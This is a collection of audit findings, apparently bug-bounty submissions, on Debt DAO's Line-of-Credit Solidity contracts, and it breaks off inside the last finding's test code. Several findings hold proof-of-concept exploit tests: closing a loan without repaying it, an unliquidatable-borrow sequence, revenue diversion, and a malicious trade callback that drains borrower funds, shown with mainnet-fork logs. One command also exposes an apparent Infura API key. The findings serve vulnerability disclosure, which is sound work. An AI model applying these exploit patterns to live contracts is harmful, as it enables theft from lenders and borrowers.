# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493   # Vulnerability details  A credit line can be closed by using the `LineOfCredit.depositAndClose()` or `LineOfCredit.close`. The remaining funds deposited by the lender (`credit.deposit`) and the accumulated and paid interest are transferred to the lender.  However, if the used credit token `credit.token` is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer.  ## Impact  The lender can prevent the borrower from closing the credit line. This leads to the following consequences:  - Migrating (rollover) to a new line is not possible (it requires all credits to be closed, see [SecuredLine.sol#L55](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L55)) - Releasing a spigot and transferring ownership to the borrower is not possible (see [SpigotedLineLib.sol#L195](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L195)) - Sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower is not possible (see (SpigotedLineLib.sol#L220)[https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L220])  ## Proof of Concept  [modules/credit/LineOfCredit.sol#L489-L493](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493)  ```solidity function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {     if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }      // return the Lender's funds that are being repaid     if (credit.deposit + credit.interestRepaid > 0) {         LineLib.sendOutTokenOrETH(             credit.token,             credit.lender,             credit.deposit + credit.interestRepaid         );     }      delete credits[id]; // gas refunds      // remove from active list     ids.removePosition(id);     unchecked { --count; }      // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.     if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }      emit CloseCreditPosition(id);      return true; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly. 
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186   # Vulnerability details  A borrower can repay (parts) of a credit line with the `SpigotedLine.useAndRepay` function. This function will use `amount` of `unusedTokens[credit.token]` as a repayment. However, if `amount` exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number.  This a problem because a borrower can unknowingly provide a larger than necessary `amount` to the `SpigotedLine.useAndRepay` function to make sure enough funds are used to fully repay the principal and the remaining interest.  Additionally, a lender can do the same thing as the lender can call this function.  ## Impact  The `credit.principal` underflows without an error and will be set to a very large number. This will force a secured line **immediately** into liquidation. Additionally, having a principal value close to `2^256 - 1` will make it hugely expensive to repay the credit line.  ## Proof of Concept  [utils/CreditLib.sol#L186](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186)  ```solidity function repay(   ILineOfCredit.Credit memory credit,   bytes32 id,   uint256 amount )   external   returns (ILineOfCredit.Credit memory) { unchecked {     if (amount <= credit.interestAccrued) {         credit.interestAccrued -= amount;         credit.interestRepaid += amount;         emit RepayInterest(id, amount);         return credit;     } else {         uint256 interest = credit.interestAccrued;         uint256 principalPayment = amount - interest;          // update individual credit line denominated in token         credit.principal -= principalPayment; // @audit-info potential underflow without an error due to the unchecked block         credit.interestRepaid += interest;         credit.interestAccrued = 0;          emit RepayInterest(id, interest);         emit RepayPrincipal(id, principalPayment);          return credit;     } } } ```  To demonstrate the issue, copy the following test case and paste it into the `SpigotedLine.t.sol` test file. Then run `forge test --match-test "test_lender_use_and_repay_underflow"`.  Following scenario causes the repayment to underflow:  1. Borrower borrows `1 ether` of `revenueToken` 2. `2 ether` worth of `revenueToken` is claimed and traded from the revenue contract 3. Use all of the previously claimed funds (`2 ether`) to repay the line of credit (= `1 ether`) 4. `credit.principal` underflows due to `principalPayment` is larger than `credit.principal`  ```solidity function test_lender_use_and_repay_underflow() public {     uint256 largeRevenueAmount = lentAmount * 2;      deal(address(lender), lentAmount + 1 ether);     deal(address(revenueToken), MAX_REVENUE);     address revenueC = address(0xbeef); // need new spigot for testing     bytes32 id = _createCredit(address(revenueToken), Denominations.ETH, revenueC);      // 1. Borrow lentAmount = 1 ether     _borrow(id, lentAmount);      // 2. Claim and trade largeRevenueAmount = 2 ether (revenue)     bytes memory tradeData = abi.encodeWithSignature(       'trade(address,address,uint256,uint256)',       address(revenueToken),       Denominations.ETH,       1 gwei,       largeRevenueAmount     );      hoax(borrower);     line.claimAndTrade(address(revenueToken), tradeData);      (, uint256 principalBeforeRepaying,,,,,) = line.credits(line.ids(0));     assertEq(principalBeforeRepaying, lentAmount);      // 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)     vm.prank(lender);     line.useAndRepay(largeRevenueAmount);     (, uint256 _principal,,,,,) = line.credits(line.ids(0));      uint256 underflowedPrincipal = principalBeforeRepaying;      unchecked {       underflowedPrincipal -= (largeRevenueAmount);     }      // 4. Principal underflowed     assertEq(_principal, underflowedPrincipal);   } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider asserting `amount` is less or equal than `credit.principal + credit.interestAccrued` (`require(amount <= credit.principal + credit.interestAccrued);`). Similar as how it is done in [`LineOfCredit.depositAndRepay()`](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326) 
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L516-L538   # Vulnerability details  ## Description  LineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\[0\], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\[0\] before other credit lines.   The list is managed by several functions:  1.  CreditListLib.removePosition - deletes parameter id in the ids array 2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element 3.  _sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:     1.  target index is not empty     2.  there is no principal owed for the target index's credit  The idea I had is that if we could corrupt the ids array so that ids\[0\] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing.   ``` modifier whileBorrowing() {     if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }     _; } ```  It turns out there is a simple sequence of calls which allows borrowing while ids\[0\] is deleted, and does not re-arrange the new borrow into ids\[0\]!  1.  id1 = addCredit() - add a new credit line, a new id is pushed to the end of ids array. 2.  id2 = addCredit() - called again, ids.length = 2 3.  close(id1) - calls removePosition() on id1, now ids array is \[0x000000000000000000000000, id2 \] 4.  borrow(id2) - will borrow from id2 and call _sortIntoQ. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).  From this sequence, we achieve a borrow while ids\[0\] is 0! Therefore, credits\[ids\[0\]\].principal = credits\[0\].principal = 0, and whileBorrowing() reverts.  The impact is massive - the following functions are disabled:  - SecureLine::liquidate() - LineOfCredit::depositAndClose() - LineOfCredit::depositAndRepay() - LineOfCredit::claimAndRepay() - LineOfCredit::claimAndTrade()  ## Impact  Borrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.  ## Proof of Concept  Copy the following code into LineOfCredit.t.sol  ``` function _addCreditLender2(address token, uint256 amount) public {     // Prepare lender 2 operations, does same as mintAndApprove()     address lender2 = address(21);     deal(lender2, mintAmount);     supportedToken1.mint(lender2, mintAmount);     supportedToken2.mint(lender2, mintAmount);     unsupportedToken.mint(lender2, mintAmount);     vm.startPrank(lender2);     supportedToken1.approve(address(line), MAX_INT);     supportedToken2.approve(address(line), MAX_INT);     unsupportedToken.approve(address(line), MAX_INT);     vm.stopPrank();     // addCredit logic     vm.prank(borrower);     line.addCredit(dRate, fRate, amount, token, lender2);     vm.stopPrank();     vm.prank(lender2);     line.addCredit(dRate, fRate, amount, token, lender2);     vm.stopPrank(); } function test_attackUnliquidatable() public {     bytes32 id_1;     bytes32 id_2;     _addCredit(address(supportedToken1), 1 ether);     _addCreditLender2(address(supportedToken1), 1 ether);     id_1 =  line.ids(0);     id_2 =  line.ids(1);     hoax(borrower);     line.close(id_1);     hoax(borrower);     line.borrow(id_2, 1 ether);     id_1 =  line.ids(0);     id_2 = line.ids(1);     console.log("id1 : ", uint256(id_1));     console.log("id2 : ", uint256(id_2));     vm.warp(ttl+1);     assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);     vm.expectRevert(ILineOfCredit.NotBorrowing.selector);     bool isSolvent = line.declareInsolvent(); } ```  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  When sorting new borrows into the ids queue, do not skip any elements.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L48   # Vulnerability details  ## Impact  When withdrawing and refund  ETH, the  contract uses Solidity’s `transfer()` function.   Using Solidity's `transfer()` function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when: * The withdrawer smart contract does not implement a payable fallback function. * The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units. * The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.  Risks of reentrancy stemming from the use of this function can be mitigated by tightly following the "Check-Effects-Interactions" pattern and using OpenZeppelin Contract’s ReentrancyGuard contract.   ## Proof of Concept  ```solidity // Line-of-Credit/contracts/utils/LineLib.sol 48:    payable(receiver).transfer(amount); ```   #### References:  The issues with `transfer()` are outlined [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/ )  For further reference on why using Solidity’s `transfer()` is no longer recommended, refer to these [articles](https://blog.openzeppelin.com/reentrancy-after-istanbul/).    ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised, [reference](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60).   
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59-L74   # Vulnerability details  ## Impact  If ERC20 and eth are transferred at same time, the mistakenly sent eth will be locked. There are several functions could be affected and cause user fund lock: - `addCollateral()` - `addCredit()` - `increaseCredit()` - `depositAndClose()` - `depositAndRepay()` - `close()`  ## Proof of Concept  In `receiveTokenOrETH()`, different logic is used to handle ERC20 and eth transfer. However, in the ERC20 if block, mistakenly sent eth will be ignored. This part of eth will be locked in the contract. ```solidity // Line-of-Credit/contracts/utils/LineLib.sol     function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ```   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  In the ERC20 part, add check for `msg.value` to ensure no eth is sent: ```solidity         if(token != Denominations.ETH) { // ERC20             if (msg.value > 0) { revert TransferFailed(); }             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH ``` 
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L389   # Vulnerability details  ## Impact A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral. ## Proof of Concept The `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID: [LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388): ```solidity function close(bytes32 id) external payable override returns (bool) {     Credit memory credit = credits[id];     address b = borrower; // gas savings     if(msg.sender != credit.lender && msg.sender != b) {       revert CallerAccessDenied();     }      // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off     credit = _accrue(credit, id);     uint256 facilityFee = credit.interestAccrued;     if(facilityFee > 0) {       // only allow repaying interest since they are skipping repayment queue.       // If principal still owed, _close() MUST fail       LineLib.receiveTokenOrETH(credit.token, b, facilityFee);        credit = _repay(credit, id, facilityFee);     }      _close(credit, id); // deleted; no need to save to storage      return true; } ```  [LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483): ```solidity function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {     if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }      // return the Lender's funds that are being repaid     if (credit.deposit + credit.interestRepaid > 0) {         LineLib.sendOutTokenOrETH(             credit.token,             credit.lender,             credit.deposit + credit.interestRepaid         );     }      delete credits[id]; // gas refunds      // remove from active list     ids.removePosition(id);     unchecked { --count; }      // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.     if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }      emit CloseCreditPosition(id);      return true; } ```  Proof of Concept: ```solidity // contracts/tests/LineOfCredit.t.sol function testCloseWithoutRepaying_AUDIT() public {     assertEq(supportedToken1.balanceOf(address(line)), 0, "Line balance should be 0");     assertEq(supportedToken1.balanceOf(lender), mintAmount, "Lender should have initial mint balance");            _addCredit(address(supportedToken1), 1 ether);      bytes32 id = line.ids(0);     assert(id != bytes32(0));      assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, "Lender should have initial balance less lent amount");          hoax(borrower);     line.borrow(id, 1 ether);     assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, "Borrower should have initial balance + loan");          // The credit hasn't been repaid.     // hoax(borrower);     // line.depositAndRepay(1 ether);          hoax(borrower);     // Closing with a non-existent credit ID.     line.close(bytes32(uint256(31337)));      // The debt hasn't been repaid but the status is REPAID.     assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));      // Lender's balance is still reduced by the borrow amount.     assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);      // Borrower's balance still includes the borrowed amount.     assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps In the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234 https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270   # Vulnerability details  ## Impact The functions `addCredit` and `increaseCredit` both ahve a `mutualConsent` or `mutualConsentById` modifier. Furthermore, these functions are `payable` and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can a problem: ```solidity modifier mutualConsent(address _signerOne, address _signerTwo) {       if(_mutualConsent(_signerOne, _signerTwo))  {         // Run whatever code needed 2/2 consent         _;       } }  function _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {         if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }          address nonCaller = _getNonCaller(_signerOne, _signerTwo);          // The consent hash is defined by the hash of the transaction call data and sender of msg,         // which uniquely identifies the function, arguments, and sender.         bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));          if (!mutualConsents[expectedHash]) {             bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));              mutualConsents[newHash] = true;              emit MutualConsentRegistered(newHash);              return false;         }          delete mutualConsents[expectedHash];          return true; } ``` The problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.  This is very problematic in combination with sending ETH for two reasons: 1.) When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost. 2.) Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.  ## Proof Of Concept Lender Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.   ## Recommended Mitigation Steps Consider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/utils/SpigotLib.sol#L87   # Vulnerability details  ## Impact Neither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` check that the provided `revenueContract` was registered before. If this is not the case, `SpigotLib._claimRevenue` assumes that this is a revenue contract with push payments (because `self.settings[revenueContract].claimFunction` is 0) and just returns the difference since the last call to `claimRevenue`: ```solidity        if(self.settings[revenueContract].claimFunction == bytes4(0)) {             // push payments              // claimed = total balance - already accounted for balance             claimed = existingBalance - self.escrowed[token]; //@audit Rebasing tokens             // underflow revert ensures we have more tokens than we started with and actually claimed revenue         } ``` `SpigotLib.claimRevenue` will then read `self.settings[revenueContract].ownerSplit`, which is 0 for non-registered revenue contracts: ```solidity uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100; ``` Therefore, the whole `claimed` amount is sent to the treasury.  This becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call `claimRevenue` with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.  ## Proof Of Concept As mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls `claimRevenue` with a non-existing address. This is illustrated in the following diff: ```diff --- a/contracts/tests/Spigot.t.sol +++ b/contracts/tests/Spigot.t.sol @@ -174,7 +174,7 @@ contract SpigotTest is Test {          assertEq(token.balanceOf(address(spigot)), totalRevenue);                    bytes memory claimData; -        spigot.claimRevenue(revenueContract, address(token), claimData); +        spigot.claimRevenue(address(0), address(token), claimData); ``` Thanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.  ## Recommended Mitigation Steps Check that a revenue contract was registered before, revert if it does not.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85   # Vulnerability details  ## Impact  Lender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData.  In the design of the protocol, the lender can use the function claimAndRepay(), the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit.   ``` function claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external         whileBorrowing         nonReentrant         returns (uint256) {   ... // Line 106 - Line 112 uint256 newTokens = claimToken == credit.token ?           spigot.claimEscrow(claimToken) :  // same asset. dont trade           _claimAndTrade(                   // trade revenue token for debt obligation               claimToken,               credit.token,               zeroExTradeData           ); ... // Line 128 - Line 130   credits[id] = _repay(credit, id, repaid);          emit RevenuePayment(claimToken, repaid);  ...  }  ```  ``` function _claimAndTrade(       address claimToken,       address targetToken,       bytes calldata zeroExTradeData     )         internal         returns (uint256)     {         (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(             claimToken,             targetToken,             swapTarget,             address(spigot),             unusedTokens[claimToken],             zeroExTradeData         );          // we dont use revenue after this so can store now         unusedTokens[claimToken] = totalUnused;         return tokensBought;     } ``` ``` function claimAndTrade(         address claimToken,         address targetToken,         address payable swapTarget,         address spigot,         uint256 unused,         bytes calldata zeroExTradeData     )     external          returns(uint256, uint256)  { ...  trade(             claimed + unused,             claimToken,             swapTarget,             zeroExTradeData         );                  // underflow revert ensures we have more tokens than we started with         uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;          if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought ...   }  ```  In the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert.   The bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.  ## Proof of Concept  The following code can manipulate and bypass the check to steal money of the borrower. Step 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract.  Step 2: In the exploit contract, have the receive() function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit.   ``` receive() external payable {     console.log("Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance");     uint256 amount = 100;      creditToken.transfer(address(line),amount);     console.log("Receive the amount of ETH: %s", msg.value);   }  ``` In the receive() function, the exploit contract transfer some amount of creditToken to the SpigotedLine contract to bypass the check  ```  if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought ``` Since this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken.   This amount then will be used to repay the credit.  So this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.  In the zip file in the Google_Drive link, there is the POC written for this bug.  The test case is test_lender_can_claim_and_repay_3 in file SpigotedLine.t.modified.sol  You can put this file to the tests folder https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing  You can run the POC by calling:  ``` forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n umber 15918000 ``` Here I use the block-number to make the test log stable, but this does not impact the logic of POC.   You can find the detailed log file: Line-of-Credit\test_claim_221107_2311.log The full log file here: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing  In this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 * ( 10 ** -18 ) BUSD for the borrower.   Logs:   Step 0: As a Borrower borrow some money    Step 1: Construct the tradeData to call claimAndRepay as the lender   claimed: 1000000000000000000000   unused: 0   sellAmount: 1000000000000000000000   Step 1: As the lender, call claimAndRepay with Malicious zeroExTradeData   Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance   Receive the amount of ETH: 632428006785336734   emit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)   emit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)   RevenuePayment(token: DAI: [0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)  You can use the POC.patch here: https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing  To use it use command  ``` git apply POC.patch  ```  To run use command  ``` forge install forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n umber 15918000  ```  The full code repository: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing   ## Tools Used Foundry  ## Recommended Mitigation Steps  This is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86   # Vulnerability details  ## Impact The modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits[ids].   Assume, when borrower chooses lender positions including credits[ids[0]] to draw on, and repays back the loan fully for credits[ids[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids[1] to ids[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.    ## Proof of Concept 1. LineOfCredit contract is set up and 5 lenders have deposited into the contract. 2. Alice, the borrower borrows credit from these 5 credit positions including by calling LineOfCredit.borrow() for the position ids. 3. Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated 4. At the point where ids.stepQ() is called in _repay(), position 1 is moved to ids[0] 4. When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`  ## Tools Used Manual review  ## Recommended Mitigation Steps The modifier whileBorrowing() would need to be reviewed and amended.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L292 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L265 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L71 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388   # Vulnerability details  ## Impact The protocol does not refund overpayment of ETH. Excessive ETH is not included in the protocols accounting as a result the funds are permanently locked in the protocol **(Loss of funds)**.  There are multiple scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol.  The vulnerability effects at least five different scenarios and locks both the lender and borrowers ETH in LineOfCredit if overpaid. **There is no way to transfer the locked ETH back to the the users**, as the withdraw methods are dependent on accounting (which is not updated with locked ETH).  This vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine  ## Proof of Concept The bug resides in `receiveTokenOrETH` function when receiving ETH.   The function does not handle cases where `msg.value` is larger than `amount` meaning a refund is needed (`msg.value` - `amount`). In such cases, `msg.value` is added to the balance of LineOfCredit although only `amount` is used in internal accounting. Thus the excessive ETH  is permanently locked in the contract as the withdraw methods are dependent on the internal accounting.  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59 ```   function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ```  Scenarios where borrowers ETH funds will be locked in LineOfCredit:  1. Borrower calls `depositAndClose` with an ETH value that is above the owed debt. 2. Borrower calls `depositAndRepay` with an ETH value that is above the amount specified in the parameters. 3. Borrower calls `close` with an ETH value that is above the owed fees.  Scenarios where lenders ETH funds will be locked in LineOfCredit: 1. Lender calls `addCredit` with and ETH value that is greater than the `amount` parameter. 2. Lender calls `increaseCredit` with and ETH value that is greater than the `amount` parameter.  The above scenarios will happen when:  * Excessive ETH is sent with the confidence that it will be refunded (expected). Intentionally or by mistake. * Excessive ETH will be sent (and expected to be refunded) when calling `depositeAndClose()`, `close(id)` and `depositAndRepay(amount)` as they internally update the fees with the `_accrue` method. The amount changes every second because part of the formula that calculates the fees is based on a multiplication of seconds past the previous calculations. In most cases, the caller will not know the amount of interest that will be accrued and must send excessive ETH to not revert the transaction.     * The formula that calculates interest:  `InterestAccrued = (rate.dRate * drawnBalance * timespan) / INTEREST_DENOMINATOR +  (rate.fRate * (facilityBalance - drawnBalance) * timespan) / INTEREST_DENOMINATOR ` Where `timespan` is `timespan= block.timestamp - rate.lastAccrued`     * Attached link to Debt DAO docs with more information: https://docs.debtdao.finance/faq/accrued-interest-calculation  The POC includes four of the mentioned scenarios. To run the POC add the below code to the LineOfCredit.t.sol test and execute `forge test -v`. Expected output: ``` Running 4 tests for contracts/tests/LineOfCredit.t.sol:LineTest [PASS] test_freeze_eth_addCredit() (gas: 277920) [PASS] test_freeze_eth_depositAndClose() (gas: 280378) [PASS] test_freeze_eth_depositAndRepay() (gas: 302991) [PASS] test_freeze_eth_increaseCredit() (gas: 318830) Test result: ok. 4 passed; 0 failed; finished in 1.59ms ``` Add the following code to tests: ```     function _addCreditEth(address token, uint256 amount) internal {         vm.prank(borrower);         line.addCredit(dRate, fRate, amount, token, lender);         vm.stopPrank();         vm.prank(lender);         line.addCredit{value: amount}(dRate, fRate, amount, token, lender);         vm.stopPrank();     }     function test_freeze_eth_depositAndClose() 